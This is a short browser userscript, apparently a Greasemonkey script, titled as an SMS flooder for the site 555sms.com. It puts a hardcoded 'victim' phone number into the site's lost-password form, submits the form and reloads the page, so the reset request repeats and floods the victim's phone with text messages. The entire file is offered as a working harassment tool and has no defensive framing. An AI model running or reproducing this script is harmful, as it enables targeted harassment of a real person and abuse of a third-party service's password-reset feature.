// ==UserScript==
// @name          Anonymous 555SMS.COM sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*555sms.com/*
// ==/UserScript==

var victim=8051210009; //Enter victims number here

if(document.location=="http://www.555sms.com/lostpass.php"||document.location=="http://www.555sms.com/lostpass.php")
{
document.getElementsByName("user_mobile")[0].value=victim;
document.forms[1].submit();
}

if(document.location=="http://www.555sms.com/lostpass.php"||document.location=="http://www.555sms.com/lostpass.php")
document.location="http://www.555sms.com/lostpass.php"